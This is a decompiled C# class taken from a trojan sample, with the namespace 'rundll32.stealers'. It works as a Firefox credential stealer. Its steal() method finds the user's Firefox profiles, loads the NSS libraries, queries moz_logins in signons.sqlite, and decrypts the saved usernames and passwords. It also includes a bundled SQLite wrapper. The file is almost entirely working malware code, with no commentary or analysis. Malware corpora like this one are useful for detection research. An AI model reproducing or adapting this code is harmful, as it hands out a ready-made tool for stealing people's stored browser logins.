// Decompiled with JetBrains decompiler
// Type: rundll32.stealers.ff
// Assembly: rundll32, Version=6.1.7600.16385, Culture=neutral, PublicKeyToken=null
// MVID: F8DEF9AB-CB2D-4DED-9871-4A53218D5E3A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.jlzp-3198bccbd4230852e51b4a91bbbb499340cca67260e90e0a7fbcec0fe32fa3e8.exe

using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace rundll32.stealers
{
  internal class ff
  {
    private static IntPtr NSS3;
    public static string signon;

    [DllImport("kernel32.dll")]
    private static extern IntPtr LoadLibrary(string dllFilePath);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    private static long NSS_Init(string configdir)
    {
      string str = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
      ff.LoadLibrary(str + "mozcrt19.dll");
      ff.LoadLibrary(str + "nspr4.dll");
      ff.LoadLibrary(str + "plc4.dll");
      ff.LoadLibrary(str + "plds4.dll");
      ff.LoadLibrary(str + "ssutil3.dll");
      ff.LoadLibrary(str + "sqlite3.dll");
      ff.LoadLibrary(str + "nssutil3.dll");
      ff.LoadLibrary(str + "softokn3.dll");
      ff.NSS3 = ff.LoadLibrary(str + "nss3.dll");
      return ((ff.DLLFunctionDelegate) Marshal.GetDelegateForFunctionPointer(ff.GetProcAddress(ff.NSS3, nameof (NSS_Init)), typeof (ff.DLLFunctionDelegate)))(configdir);
    }

    private static long PK11_GetInternalKeySlot() => ((ff.DLLFunctionDelegate2) Marshal.GetDelegateForFunctionPointer(ff.GetProcAddress(ff.NSS3, nameof (PK11_GetInternalKeySlot)), typeof (ff.DLLFunctionDelegate2)))();

    private static long PK11_Authenticate(long slot, bool loadCerts, long wincx) => ((ff.DLLFunctionDelegate3) Marshal.GetDelegateForFunctionPointer(ff.GetProcAddress(ff.NSS3, nameof (PK11_Authenticate)), typeof (ff.DLLFunctionDelegate3)))(slot, loadCerts, wincx);

    private static int NSSBase64_DecodeBuffer(
      IntPtr arenaOpt,
      IntPtr outItemOpt,
      StringBuilder inStr,
      int inLen)
    {
      return ((ff.DLLFunctionDelegate4) Marshal.GetDelegateForFunctionPointer(ff.GetProcAddress(ff.NSS3, nameof (NSSBase64_DecodeBuffer)), typeof (ff.DLLFunctionDelegate4)))(arenaOpt, outItemOpt, inStr, inLen);
    }

    private static int PK11SDR_Decrypt(ref ff.TSECItem data, ref ff.TSECItem result, int cx) => ((ff.DLLFunctionDelegate5) Marshal.GetDelegateForFunctionPointer(ff.GetProcAddress(ff.NSS3, nameof (PK11SDR_Decrypt)), typeof (ff.DLLFunctionDelegate5)))(ref data, ref result, cx);

    public static ff.ffEntry[] steal()
    {
      bool flag = false;
      List<ff.ffEntry> ffEntryList = new List<ff.ffEntry>();
      string str1 = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
      foreach (string directory in Directory.GetDirectories(Environment.GetEnvironmentVariable("APPDATA") + "\\Mozilla\\Firefox\\Profiles"))
      {
        if (!flag)
        {
          foreach (string file in Directory.GetFiles(directory))
          {
            if (!flag)
            {
              if (Regex.IsMatch(file, "signons.sqlite"))
              {
                ff.NSS_Init(directory);
                ff.signon = file;
              }
            }
            else
              break;
          }
        }
        else
          break;
      }
      string signon = ff.signon;
      ff.TSECItem result1 = new ff.TSECItem();
      ff.TSECItem result2 = new ff.TSECItem();
      DataTable dataTable = new ff.SQLiteBase(signon).ExecuteQuery("SELECT * FROM moz_logins;");
      ff.PK11_Authenticate(ff.PK11_GetInternalKeySlot(), true, 0L);
      foreach (DataRow row in (InternalDataCollectionBase) dataTable.Rows)
      {
        string str2 = Convert.ToString(row["formSubmitURL"].ToString());
        string str3 = "";
        string str4 = "";
        StringBuilder inStr1 = new StringBuilder(row["encryptedUsername"].ToString());
        ff.TSECItem structure1 = (ff.TSECItem) Marshal.PtrToStructure(new IntPtr(ff.NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, inStr1, inStr1.Length)), typeof (ff.TSECItem));
        if (ff.PK11SDR_Decrypt(ref structure1, ref result1, 0) == 0 && result1.SECItemLen != 0)
        {
          byte[] numArray = new byte[result1.SECItemLen];
          Marshal.Copy(new IntPtr(result1.SECItemData), numArray, 0, result1.SECItemLen);
          str3 = Encoding.ASCII.GetString(numArray);
        }
        StringBuilder inStr2 = new StringBuilder(row["encryptedPassword"].ToString());
        ff.TSECItem structure2 = (ff.TSECItem) Marshal.PtrToStructure(new IntPtr(ff.NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, inStr2, inStr2.Length)), typeof (ff.TSECItem));
        if (ff.PK11SDR_Decrypt(ref structure2, ref result2, 0) == 0 && result2.SECItemLen != 0)
        {
          byte[] numArray = new byte[result2.SECItemLen];
          Marshal.Copy(new IntPtr(result2.SECItemData), numArray, 0, result2.SECItemLen);
          str4 = Encoding.ASCII.GetString(numArray);
        }
        ffEntryList.Add(new ff.ffEntry()
        {
          host = str2,
          user = str3,
          pass = str4
        });
      }
      return ffEntryList.ToArray();
    }

    public class SHITEMID
    {
      public static long cb;
      public static byte[] abID;
    }

    public struct TSECItem
    {
      public int SECItemType;
      public int SECItemData;
      public int SECItemLen;
    }

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate long DLLFunctionDelegate(string configdir);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate long DLLFunctionDelegate2();

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate long DLLFunctionDelegate3(long slot, bool loadCerts, long wincx);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate int DLLFunctionDelegate4(
      IntPtr arenaOpt,
      IntPtr outItemOpt,
      StringBuilder inStr,
      int inLen);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate int DLLFunctionDelegate5(ref ff.TSECItem data, ref ff.TSECItem result, int cx);

    public struct ffEntry
    {
      public string host;
      public string user;
      public string pass;
    }

    internal class SQLiteBase
    {
      private const int SQL_DONE = 101;
      private const int SQL_OK = 0;
      private const int SQL_ROW = 100;
      private IntPtr database;

      public SQLiteBase() => this.database = IntPtr.Zero;

      public SQLiteBase(string baseName) => this.OpenDatabase(baseName);

      public void CloseDatabase()
      {
        if (!(this.database != IntPtr.Zero))
          return;
        ff.SQLiteBase.sqlite3_close(this.database);
      }

      public void ExecuteNonQuery(string query)
      {
        IntPtr error;
        ff.SQLiteBase.sqlite3_exec(this.database, this.StringToPointer(query), IntPtr.Zero, IntPtr.Zero, out error);
        if (error != IntPtr.Zero)
          throw new Exception("Error with executing non-query: \"" + query + "\"!\n" + this.PointerToString(ff.SQLiteBase.sqlite3_errmsg(error)));
      }

      public DataTable ExecuteQuery(string query)
      {
        IntPtr statement;
        ff.SQLiteBase.sqlite3_prepare_v2(this.database, this.StringToPointer(query), this.GetPointerLenght(this.StringToPointer(query)), out statement, out IntPtr _);
        DataTable table = new DataTable();
        int num = this.ReadFirstRow(statement, ref table);
        while (num == 100)
          num = this.ReadNextRow(statement, ref table);
        ff.SQLiteBase.sqlite3_finalize(statement);
        return table;
      }

      private int GetPointerLenght(IntPtr ptr) => ptr == IntPtr.Zero ? 0 : ff.SQLiteBase.lstrlen(ptr);

      [DllImport("kernel32")]
      private static extern IntPtr GetProcessHeap();

      public ArrayList GetTables()
      {
        DataTable dataTable = this.ExecuteQuery("SELECT name FROM sqlite_master WHERE type IN ('table','view') AND name NOT LIKE 'sqlite_%'UNION ALL SELECT name FROM sqlite_temp_master WHERE type IN ('table','view') ORDER BY 1");
        ArrayList tables = new ArrayList();
        foreach (DataRow row in (InternalDataCollectionBase) dataTable.Rows)
          tables.Add((object) row.ItemArray[0].ToString());
        return tables;
      }

      [DllImport("kernel32")]
      private static extern IntPtr HeapAlloc(IntPtr heap, uint flags, uint bytes);

      [DllImport("kernel32")]
      private static extern int lstrlen(IntPtr str);

      public void OpenDatabase(string baseName)
      {
        if (ff.SQLiteBase.sqlite3_open(this.StringToPointer(baseName), out this.database) != 0)
        {
          this.database = IntPtr.Zero;
          throw new Exception("Error with opening database " + baseName + "!");
        }
      }

      private string PointerToString(IntPtr ptr)
      {
        if (ptr == IntPtr.Zero)
          return (string) null;
        Encoding utF8 = Encoding.UTF8;
        int pointerLenght = this.GetPointerLenght(ptr);
        byte[] numArray = new byte[pointerLenght];
        Marshal.Copy(ptr, numArray, 0, pointerLenght);
        return utF8.GetString(numArray, 0, pointerLenght);
      }

      private int ReadFirstRow(IntPtr statement, ref DataTable table)
      {
        table = new DataTable("resultTable");
        if (ff.SQLiteBase.sqlite3_step(statement) == 100)
        {
          int length = ff.SQLiteBase.sqlite3_column_count(statement);
          object[] objArray = new object[length];
          for (int columnNumber = 0; columnNumber < length; ++columnNumber)
          {
            string columnName = this.PointerToString(ff.SQLiteBase.sqlite3_column_name(statement, columnNumber));
            switch (ff.SQLiteBase.sqlite3_column_type(statement, columnNumber))
            {
              case 1:
                table.Columns.Add(columnName, Type.GetType("System.Int32"));
                objArray[columnNumber] = (object) ff.SQLiteBase.sqlite3_column_int(statement, columnNumber);
                break;
              case 2:
                table.Columns.Add(columnName, Type.GetType("System.Single"));
                objArray[columnNumber] = (object) ff.SQLiteBase.sqlite3_column_double(statement, columnNumber);
                break;
              case 3:
                table.Columns.Add(columnName, Type.GetType("System.String"));
                objArray[columnNumber] = (object) this.PointerToString(ff.SQLiteBase.sqlite3_column_text(statement, columnNumber));
                break;
              case 4:
                table.Columns.Add(columnName, Type.GetType("System.String"));
                objArray[columnNumber] = (object) this.PointerToString(ff.SQLiteBase.sqlite3_column_blob(statement, columnNumber));
                break;
              default:
                table.Columns.Add(columnName, Type.GetType("System.String"));
                objArray[columnNumber] = (object) "";
                break;
            }
          }
          table.Rows.Add(objArray);
        }
        return ff.SQLiteBase.sqlite3_step(statement);
      }

      private int ReadNextRow(IntPtr statement, ref DataTable table)
      {
        int length = ff.SQLiteBase.sqlite3_column_count(statement);
        object[] objArray = new object[length];
        for (int columnNumber = 0; columnNumber < length; ++columnNumber)
        {
          switch (ff.SQLiteBase.sqlite3_column_type(statement, columnNumber))
          {
            case 1:
              objArray[columnNumber] = (object) ff.SQLiteBase.sqlite3_column_int(statement, columnNumber);
              break;
            case 2:
              objArray[columnNumber] = (object) ff.SQLiteBase.sqlite3_column_double(statement, columnNumber);
              break;
            case 3:
              objArray[columnNumber] = (object) this.PointerToString(ff.SQLiteBase.sqlite3_column_text(statement, columnNumber));
              break;
            case 4:
              objArray[columnNumber] = (object) this.PointerToString(ff.SQLiteBase.sqlite3_column_blob(statement, columnNumber));
              break;
            default:
              objArray[columnNumber] = (object) "";
              break;
          }
        }
        table.Rows.Add(objArray);
        return ff.SQLiteBase.sqlite3_step(statement);
      }

      [DllImport("sqlite3")]
      private static extern int sqlite3_close(IntPtr database);

      [DllImport("sqlite3")]
      private static extern IntPtr sqlite3_column_blob(IntPtr statement, int columnNumber);

      [DllImport("sqlite3")]
      private static extern int sqlite3_column_count(IntPtr statement);

      [DllImport("sqlite3")]
      private static extern double sqlite3_column_double(IntPtr statement, int columnNumber);

      [DllImport("sqlite3")]
      private static extern int sqlite3_column_int(IntPtr statement, int columnNumber);

      [DllImport("sqlite3")]
      private static extern IntPtr sqlite3_column_name(IntPtr statement, int columnNumber);

      [DllImport("sqlite3")]
      private static extern IntPtr sqlite3_column_table_name(
        IntPtr statement,
        int columnNumber);

      [DllImport("sqlite3")]
      private static extern IntPtr sqlite3_column_text(IntPtr statement, int columnNumber);

      [DllImport("sqlite3")]
      private static extern int sqlite3_column_type(IntPtr statement, int columnNumber);

      [DllImport("sqlite3")]
      private static extern IntPtr sqlite3_errmsg(IntPtr database);

      [DllImport("sqlite3")]
      private static extern int sqlite3_exec(
        IntPtr database,
        IntPtr query,
        IntPtr callback,
        IntPtr arguments,
        out IntPtr error);

      [DllImport("sqlite3")]
      private static extern int sqlite3_finalize(IntPtr handle);

      [DllImport("sqlite3")]
      private static extern int sqlite3_open(IntPtr fileName, out IntPtr database);

      [DllImport("sqlite3")]
      private static extern int sqlite3_prepare_v2(
        IntPtr database,
        IntPtr query,
        int length,
        out IntPtr statement,
        out IntPtr tail);

      [DllImport("sqlite3")]
      private static extern int sqlite3_step(IntPtr statement);

      private IntPtr StringToPointer(string str)
      {
        if (str == null)
          return IntPtr.Zero;
        byte[] bytes1 = Encoding.UTF8.GetBytes(str);
        int bytes2 = bytes1.Length + 1;
        IntPtr pointer = ff.SQLiteBase.HeapAlloc(ff.SQLiteBase.GetProcessHeap(), 0U, (uint) bytes2);
        Marshal.Copy(bytes1, 0, pointer, bytes1.Length);
        Marshal.WriteByte(pointer, bytes1.Length, (byte) 0);
        return pointer;
      }

      public enum SQLiteDataTypes
      {
        INT = 1,
        FLOAT = 2,
        TEXT = 3,
        BLOB = 4,
        NULL = 5,
      }
    }
  }
}
